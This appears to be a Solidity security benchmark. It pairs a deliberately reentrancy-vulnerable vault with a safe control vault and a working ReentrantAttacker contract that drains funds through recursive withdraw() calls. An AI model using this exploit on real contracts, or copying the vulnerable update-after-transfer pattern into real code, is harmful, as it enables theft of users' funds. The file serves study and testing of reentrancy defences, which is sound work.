// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/// @notice Deliberately vulnerable benchmark. Effects occur after the external call.
contract VulnerableVault {
    mapping(address => uint256) public credit;
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        credit[msg.sender] += msg.value;
    }
    function withdraw() external {
        uint256 amount = credit[msg.sender];
        require(amount > 0, "no credit");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
        credit[msg.sender] = 0;
    }
    receive() external payable {}
}

/// @notice Negative control: checks-effects-interactions prevents recursive withdrawal.
contract SafeVault {
    mapping(address => uint256) public credit;
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        credit[msg.sender] += msg.value;
    }
    function withdraw() external {
        uint256 amount = credit[msg.sender];
        require(amount > 0, "no credit");
        credit[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
    }
    receive() external payable {}
}

/// @notice Adversarial actor. Nested calls are best-effort so the safe control
/// can reject reentry without reverting the initial withdrawal.
contract ReentrantAttacker {
    address public immutable vault;
    bool private attacking;
    constructor(address vault_) { vault = vault_; }
    function attack() external payable {
        require(msg.value > 0, "fund attack");
        (bool deposited,) = vault.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(deposited, "deposit failed");
        attacking = true;
        (bool withdrawn,) = vault.call(abi.encodeWithSignature("withdraw()"));
        require(withdrawn, "initial withdrawal failed");
        attacking = false;
    }
    receive() external payable {
        if (attacking && vault.balance >= 1 ether) {
            (bool ignored,) = vault.call(abi.encodeWithSignature("withdraw()"));
            ignored;
        }
    }
}
